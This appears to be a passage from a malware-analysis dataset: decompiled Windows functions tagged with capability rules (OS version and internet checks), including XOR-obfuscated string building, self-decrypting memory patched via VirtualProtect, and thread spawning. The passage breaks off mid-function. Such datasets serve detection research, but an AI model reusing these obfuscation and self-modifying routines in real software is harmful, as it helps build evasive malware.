        "decompiled_code": "\nuint32_t __cdecl fcn.0041ff90(char *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    while (iVar1 = arg_ch + -1,  arg_ch != 0) {\n        var_ch = *arg_8h;\n        arg_8h = arg_8h + 1;\n        for (var_8h = 0; arg_ch = iVar1,  var_8h < 8; var_8h = var_8h + 1) {\n            if (((var_4h ^ var_ch) & 1) == 0) {\n                var_4h = var_4h >> 1;\n            }\n            else {\n                var_4h = var_4h >> 1 ^ 0xedb88320;\n            }\n            var_ch = var_ch >> 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 245
    },
    "00420070": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00420070(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint arg_ch;\n    uint var_478h;\n    uint var_270h;\n    uint var_230h;\n    uint var_1f0h;\n    uint var_1e4h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uchar var_180h;\n    uchar var_17fh;\n    uchar var_17eh;\n    uchar var_17dh;\n    uchar var_17ch;\n    uchar var_17bh;\n    uchar var_17ah;\n    uchar var_179h;\n    uchar var_178h;\n    uchar var_177h;\n    uchar var_176h;\n    uchar var_175h;\n    uchar var_174h;\n    uchar var_173h;\n    uchar var_172h;\n    uchar var_171h;\n    uchar var_170h;\n    uchar var_16fh;\n    uchar var_16eh;\n    uchar var_16dh;\n    uchar var_16ch;\n    uchar var_16bh;\n    uchar var_16ah;\n    uchar var_169h;\n    uchar var_168h;\n    uchar var_167h;\n    uchar var_166h;\n    uchar var_165h;\n    uchar var_164h;\n    uchar var_163h;\n    uchar var_162h;\n    uchar var_161h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uchar var_15dh;\n    uchar var_15ch;\n    uchar var_15bh;\n    uchar var_15ah;\n    uchar var_159h;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uchar var_150h;\n    uchar var_14fh;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uchar var_144h;\n    uchar var_143h;\n    uchar var_142h;\n    uint8_t var_140h [4];\n    uchar var_13ch;\n    uchar var_13bh;\n    uchar var_13ah;\n    uchar var_139h;\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uint var_128h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uchar var_11ah;\n    uchar var_119h;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uint var_114h;\n    uchar var_110h;\n    uchar var_10fh;\n    uchar var_10eh;\n    uchar var_10dh;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uint8_t var_100h [4];\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uint var_ech;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uint var_dch;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uint var_cch;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uint8_t var_bch [4];\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uint var_b0h;\n    uchar var_ach;\n    uchar var_abh;\n    uint8_t var_a8h [4];\n    uchar var_a4h;\n    uchar var_a3h;\n    uint8_t var_a0h [4];\n    uchar var_9ch;\n    uchar var_9bh;\n    uint8_t var_98h [4];\n    uchar var_94h;\n    uchar var_93h;\n    uint8_t var_90h [4];\n    uchar var_8ch;\n    uchar var_8bh;\n    uint var_88h;\n    uchar var_84h;\n    uint var_80h;\n    uchar var_7ch;\n    uint var_78h;\n    uchar var_74h;\n    uint var_70h;\n    uchar var_6ch;\n    uint var_68h;\n    uchar var_64h;\n    uint var_60h;\n    uchar var_5ch;\n    uint var_58h;\n    uchar var_54h;\n    uint var_50h;\n    uchar var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_1bch = 0;\n    var_4h = 0;\n    var_1c4h = 0x208;\n    var_1d4h = 0;\n    var_114h._0_1_ = 0x24;\n    var_114h._1_1_ = 0x61;\n    var_114h._2_1_ = 0x79;\n    var_114h._3_1_ = 0x52;\n    var_110h = 5;\n    var_10fh = 0;\n    var_10eh = 0x5d;\n    var_10dh = 0x2f;\n    var_10ch = 0x52;\n    var_10bh = 0;\n    var_10ah = 6;\n    var_109h = 0x43;\n    var_108h = 0x38;\n    var_107h = 7;\n    var_106h = 0x13;\n    var_105h = 0x1d;\n    var_104h = 0x54;\n    var_103h = 0x2e;\n    var_102h = 0x72;\n    var_88h._0_1_ = 0x69;\n    var_88h._1_1_ = 0x31;\n    var_88h._2_1_ = 0x4a;\n    var_88h._3_1_ = 0x72;\n    var_84h = 99;\n    fcn.004012a0(0x13);\n    for (var_ch = 0; var_ch < 0x13; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_114h + var_ch) ^ *(&var_88h + var_ch % 5));\n    }\n    uVar1 = fcn.00401270();\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00422230, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n    iVar2 = fcn.00421570();\n    if (iVar2 == 0) {\n        fcn.00421690();\n        fcn.00411d20();\n        while ((iVar2 = fcn.00413ae0(),  iVar2 != 0 || (iVar2 = fcn.00411cd0(),  iVar2 != 0))) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x436508, 0x184, 0x40, &var_1b8h);\n    if (iVar2 != 0) {\n        fcn.004230a0(0x436508, 0x184);\n        (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x436508, 0x184, var_1b8h, &var_1b8h);\n    }\n    puVar3 = 0x436bc0;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    arg_ch = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, 0x343);\n    fcn.0041ea00(uVar1, arg_ch);\n    puVar4 = &var_1f0h;\n    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_1d0h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar3 = 0x436bb0;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar4 = &var_478h;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_478h, &var_1c4h);\n    if (iVar2 != 0) {\n        var_100h[0] = 0x1f;\n        var_100h[1] = 0x49;\n        var_100h[2] = 0x25;\n        var_100h[3] = 0x30;\n        var_fch = 0x28;\n        var_fbh = 0x4a;\n        var_fah = 0x1b;\n        var_f9h = 0x76;\n        var_f8h = 0x7e;\n        var_f7h = 0x6d;\n        var_f6h = 0xb;\n        var_f5h = 0x49;\n        var_f4h = 0x3b;\n        var_f3h = 0x30;\n        var_f2h = 0x28;\n        var_f1h = 0x4a;\n        var_f0h = 0x49;\n        var_efh = 0x76;\n        var_80h._0_1_ = 0x4a;\n        var_80h._1_1_ = 0x49;\n        var_80h._2_1_ = 0x76;\n        var_80h._3_1_ = 0x30;\n        var_7ch = 0x6d;\n        fcn.004012a0(0x24);\n        for (var_10h = 0; var_10h < 0x12; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, var_100h[var_10h] ^ *(&var_80h + var_10h % 5));\n        }\n        uVar1 = fcn.00401270(&var_478h);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(uVar1);\n        fcn.004012d0();\n    }\n    iVar2 = fcn.00401340(*0x436b48, &var_1f0h);\n    if (iVar2 != 0) {\n        if (2 < var_1f0h._1_1_) {\n            for (var_40h = 0; var_40h < var_1f0h._1_1_ - 2; var_40h = var_40h + 1) {\n                *0x436b98 = *0x436b98 + (&var_1e4h)[var_40h];\n            }\n        }\n        *0x436b98 = *0x436b98 ^ 0x3dd5193;\n        iVar2 = fcn.00421090();\n        if (iVar2 != 0) {\n            if ((*0x436b6c & 0xff) < 6) {\n                var_184h._0_1_ = 0x15;\n                var_184h._1_1_ = 0x60;\n                var_184h._2_1_ = 0x62;\n                var_184h._3_1_ = 0x33;\n                var_180h = 0x73;\n                var_17fh = 0x1e;\n                var_17eh = 0x13;\n                var_17dh = 9;\n                var_17ch = 0x3e;\n                var_17bh = 0x73;\n                var_17ah = 0x16;\n                var_179h = 0x1b;\n                var_178h = 0x71;\n                var_177h = 0x4c;\n                var_176h = 0x73;\n                var_175h = 0x13;\n                var_174h = 0x1d;\n                var_173h = 99;\n                var_172h = 0x5f;\n                var_171h = 0xc;\n                var_170h = 0x6a;\n                var_16fh = 0x15;\n                var_16eh = 3;\n                var_16dh = 0x34;\n                var_16ch = 1;\n                var_16bh = 0x6a;\n                var_16ah = 0x1d;\n                var_169h = 0xb;\n                var_168h = 0x4c;\n                var_167h = 0x73;\n                var_166h = 0x6a;\n                var_165h = 0x1b;\n                var_164h = 4;\n                var_163h = 0x5e;\n                var_162h = 0x60;\n                var_161h = 0x10;\n                var_160h = 0x61;\n                var_15fh = 5;\n                var_15eh = 0x3e;\n                var_15dh = 0xb;\n                var_15ch = 0x18;\n                var_15bh = 0x61;\n                var_15ah = 0xd;\n                var_159h = 0x36;\n                var_158h = 0x73;\n                var_157h = 0x6a;\n                var_156h = 0x61;\n                var_155h = 0xb;\n                var_154h = 0x22;\n                var_153h = 0x61;\n                var_152h = 0x79;\n                var_151h = 0x1b;\n                var_150h = 0x71;\n                var_14fh = 0x38;\n                var_14eh = 1;\n                var_14dh = 0x12;\n                var_14ch = 0x13;\n                var_14bh = 0x71;\n                var_14ah = 0x30;\n                var_149h = 9;\n                var_148h = 0x6a;\n                var_147h = 0x61;\n                var_146h = 0x71;\n                var_145h = 0x35;\n                var_144h = 9;\n                var_143h = 0x78;\n                var_142h = 0x5a;\n                var_78h._0_1_ = 0x51;\n                var_78h._1_1_ = 0x5a;\n                var_78h._2_1_ = 0x4a;\n                var_78h._3_1_ = 0x77;\n                var_74h = 0x48;\n                fcn.004012a0(0x43);\n                for (var_18h = 0; var_18h < 0x43; var_18h = var_18h + 1) {\n                    fcn.00401280(var_18h, *(&var_184h + var_18h) ^ *(&var_78h + var_18h % 5));\n                }\n                uVar1 = fcn.00401270();\n                fcn.004012f0(&var_1d0h, uVar1);\n                fcn.004012d0();\n            }\n            else {\n                var_ech._0_1_ = 0x1e;\n                var_ech._1_1_ = 0x5c;\n                var_ech._2_1_ = 0x43;\n                var_ech._3_1_ = 0x18;\n                var_e8h = 0xe;\n                var_e7h = 0x41;\n                var_e6h = 0x76;\n                var_e5h = 0x28;\n                var_e4h = 0x3c;\n                var_e3h = 0x6e;\n                var_e2h = 0x79;\n                var_e1h = 0x41;\n                var_e0h = 1;\n                var_dfh = 0x31;\n                var_deh = 0x42;\n                var_ddh = 0x55;\n                var_90h[0] = 0x4d;\n                var_90h[1] = 0x66;\n                var_90h[2] = 0x6b;\n                var_90h[3] = 0x55;\n                var_8ch = 0x42;\n                var_8bh = 0x7a;\n                fcn.004012a0(0x10);\n                for (var_14h = 0; var_14h < 0x10; var_14h = var_14h + 1) {\n                    fcn.00401280(var_14h, *(&var_ech + var_14h) ^ var_90h[var_14h % 6]);\n                }\n                uVar1 = fcn.00401270();\n                fcn.004012f0(&var_1d0h, uVar1);\n                fcn.004012d0();\n            }\n            if ((*0x436b50 & 1) != 0) {\n                var_1bch = 8;\n            }\n        }\n    }\n    *0x436bbc = fcn.004222f0();\n    *0x436bbc = *0x436bbc & 0xffff;\n    var_cch._0_1_ = 0x51;\n    var_cch._1_1_ = 0x40;\n    var_cch._2_1_ = 0x2f;\n    var_cch._3_1_ = 0x25;\n    var_c8h = 0x25;\n    var_c7h = 0x57;\n    var_c6h = 0x50;\n    var_c5h = 0x2f;\n    var_c4h = 0x1e;\n    var_c3h = 0x23;\n    var_c2h = 0x58;\n    var_c1h = 0x5d;\n    var_c0h = 0x38;\n    var_bfh = 0x7a;\n    var_70h._0_1_ = 0x34;\n    var_70h._1_1_ = 0x38;\n    var_70h._2_1_ = 0x4a;\n    var_70h._3_1_ = 0x7a;\n    var_6ch = 0x56;\n    fcn.004012a0(0xe);\n    for (var_1ch = 0; var_1ch < 0xe; var_1ch = var_1ch + 1) {\n        fcn.00401280(var_1ch, *(&var_cch + var_1ch) ^ *(&var_70h + var_1ch % 5));\n    }\n    var_dch._0_1_ = 0x24;\n    var_dch._1_1_ = 0x3f;\n    var_dch._2_1_ = 0x58;\n    var_dch._3_1_ = 0x56;\n    var_d8h = 0x17;\n    var_d7h = 0x36;\n    var_d6h = 0x27;\n    var_d5h = 0x56;\n    var_d4h = 0x56;\n    var_d3h = 0x16;\n    var_d2h = 0x3a;\n    var_d1h = 0x3f;\n    var_d0h = 0x54;\n    var_cfh = 0x38;\n    var_58h._0_1_ = 0x57;\n    var_58h._1_1_ = 0x4b;\n    var_58h._2_1_ = 0x39;\n    var_58h._3_1_ = 0x38;\n    var_54h = 0x73;\n    fcn.004012a0(0xe);\n    for (var_8h = 0; var_8h < 0xe; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_dch + var_8h) ^ *(&var_58h + var_8h % 5));\n    }\n    var_b0h._0_1_ = 99;\n    var_b0h._1_1_ = 0x4a;\n    var_b0h._2_1_ = 0x3a;\n    var_b0h._3_1_ = 0x7d;\n    var_ach = 0x1c;\n    var_abh = 0x46;\n    var_68h._0_1_ = 0x46;\n    var_68h._1_1_ = 0x39;\n    var_68h._2_1_ = 0x65;\n    var_68h._3_1_ = 0x58;\n    var_64h = 0x78;\n    fcn.004012a0(6);\n    for (var_20h = 0; var_20h < 6; var_20h = var_20h + 1) {\n        fcn.00401280(var_20h, *(&var_b0h + var_20h) ^ *(&var_68h + var_20h % 5));\n    }\n    uVar1 = fcn.00401270(var_188h, *0x436648);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_230h, uVar1);\n    *0x436bbc = 6000;\n    var_3ch._0_1_ = 0x6c;\n    var_3ch._1_1_ = 2;\n    var_3ch._2_1_ = 99;\n    var_a8h[0] = 0x49;\n    var_a8h[1] = 0x66;\n    var_a8h[2] = 99;\n    var_a8h[3] = 0x4c;\n    var_a4h = 0x45;\n    var_a3h = 0x4e;\n    fcn.004012a0(3);\n    for (var_24h = 0; var_24h < 3; var_24h = var_24h + 1) {\n        fcn.00401280(var_24h, *(&var_3ch + var_24h) ^ var_a8h[var_24h % 6]);\n    }\n    uVar1 = fcn.00401270(*0x436bbc);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_270h, uVar1);\n    var_60h._0_1_ = 0x32;\n    var_60h._1_1_ = 0x23;\n    var_60h._2_1_ = 0x3f;\n    var_60h._3_1_ = 0x32;\n    var_5ch = 0x67;\n    var_50h._0_1_ = 0x46;\n    var_50h._1_1_ = 0x51;\n    var_50h._2_1_ = 0x4a;\n    var_50h._3_1_ = 0x57;\n    var_4ch = 0x67;\n    fcn.004012a0(5);\n    for (var_28h = 0; var_28h < 5; var_28h = var_28h + 1) {\n        fcn.00401280(var_28h, *(&var_60h + var_28h) ^ *(&var_50h + var_28h % 5));\n    }\n    var_bch[0] = 0x25;\n    var_bch[1] = 1;\n    var_bch[2] = 0x1f;\n    var_bch[3] = 0x25;\n    var_b8h = 0x1e;\n    var_b7h = 0x21;\n    var_b6h = 0x3b;\n    var_b5h = 0x18;\n    var_b4h = 0x25;\n    var_b3h = 0x71;\n    var_48h._0_1_ = 0x53;\n    var_48h._1_1_ = 100;\n    var_48h._2_1_ = 0x71;\n    var_48h._3_1_ = 0x41;\n    var_44h = 0x71;\n    fcn.004012a0(10);\n    for (var_2ch = 0; var_2ch < 10; var_2ch = var_2ch + 1) {\n        fcn.00401280(var_2ch, var_bch[var_2ch] ^ *(&var_48h + var_2ch % 5));\n    }\n    var_128h._0_1_ = 6;\n    var_128h._1_1_ = 0x2d;\n    var_128h._2_1_ = 0x18;\n    var_128h._3_1_ = 0x5f;\n    var_124h = 0x1b;\n    var_123h = 0x35;\n    var_122h = 4;\n    var_121h = 0x2f;\n    var_120h = 0x14;\n    var_11fh = 0x42;\n    var_11eh = 0x18;\n    var_11dh = 0x28;\n    var_11ch = 0x1d;\n    var_11bh = 0x29;\n    var_11ah = 3;\n    var_119h = 0x43;\n    var_118h = 2;\n    var_117h = 0x23;\n    var_116h = 0xe;\n    var_115h = 0x4c;\n    var_a0h[0] = 0x6b;\n    var_a0h[1] = 0x4c;\n    var_a0h[2] = 0x71;\n    var_a0h[3] = 0x31;\n    var_9ch = 0x6b;\n    var_9bh = 0x47;\n    fcn.004012a0(0x14);\n    for (var_30h = 0; var_30h < 0x14; var_30h = var_30h + 1) {\n        fcn.00401280(var_30h, *(&var_128h + var_30h) ^ var_a0h[var_30h % 6]);\n    }\n    var_140h[0] = 0x11;\n    var_140h[1] = 0x33;\n    var_140h[2] = 0x38;\n    var_140h[3] = 0x34;\n    var_13ch = 0x3d;\n    var_13bh = 0x21;\n    var_13ah = 0xf;\n    var_139h = 0x3b;\n    var_138h = 0x25;\n    var_137h = 0x24;\n    var_136h = 0x37;\n    var_135h = 0x22;\n    var_134h = 0x13;\n    var_133h = 0x3d;\n    var_132h = 0x24;\n    var_131h = 0x24;\n    var_130h = 0x10;\n    var_12fh = 0x2d;\n    var_12eh = 0x30;\n    var_12dh = 0x37;\n    var_12ch = 0x56;\n    var_98h[0] = 0x43;\n    var_98h[1] = 0x52;\n    var_98h[2] = 0x56;\n    var_98h[3] = 0x50;\n    var_94h = 0x52;\n    var_93h = 0x4c;\n    fcn.004012a0(0x15);\n    for (var_34h = 0; var_34h < 0x15; var_34h = var_34h + 1) {\n        fcn.00401280(var_34h, var_140h[var_34h] ^ var_98h[var_34h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uVar1);\n    uVar1 = fcn.00401270(&var_230h);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uVar1);\n    uVar1 = fcn.00401270(0x43664c);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uVar1);\n    uVar1 = fcn.00401270(&var_270h);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    var_38h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    puVar4 = var_38h;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *var_38h = 0x20;\n    var_38h[1] = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004227c0, *0x436b44, 0, 0);\n    *(var_4h * 4 + 0x436bc0) = uVar1;\n    var_4h = var_4h + 1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00409b30, var_38h, 0, 0);\n    *(var_4h * 4 + 0x436bc0) = uVar1;\n    var_4h = var_4h + 1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a320, var_38h, 0, 0);\n    *(var_4h * 4 + 0x436bc0) = uVar1;\n    var_4h = var_4h + 1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00415930, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n    var_1c0h = 0;\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_1c0h;\n}\n",
        "token_count": 8193
    },
    "004212f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004212f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_4h = 0;\n    do {\n        if (4 < var_4h) {\n            return var_ch;\n        }\n        var_8h = 0;\n        var_10h = 0;\n        puVar2 = &var_1ch;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        var_14h = fcn.00410bc0(arg_8h, &var_1ch, arg_ch * 10, 0, &var_10h, &var_8h, 0x1bb);\n        if (var_14h == 0) {\n            if (var_8h == var_10h) {\n                if (var_1ch == 4) {\n                    var_ch = *var_18h;\n                }\n                var_8h = 0;\n                fcn.004245f0(&var_1ch);\n            }\n            if (var_ch != -1) {\n                return var_ch;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 403
    },
    "00421690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00421690(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint pszFirst;\n    uint lpSystemInfo;\n    uint lpBuffer;\n    uint32_t var_15ch;\n    int32_t var_158h;\n    int32_t var_124h;\n    int32_t var_120h;\n    uint var_11ch;\n    uint hKey;\n    code *var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    int16_t var_fah;\n    uint var_f8h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uint8_t var_98h [4];\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uint8_t var_20h [4];\n    uchar var_1ch;\n    uint *var_18h;\n    int32_t 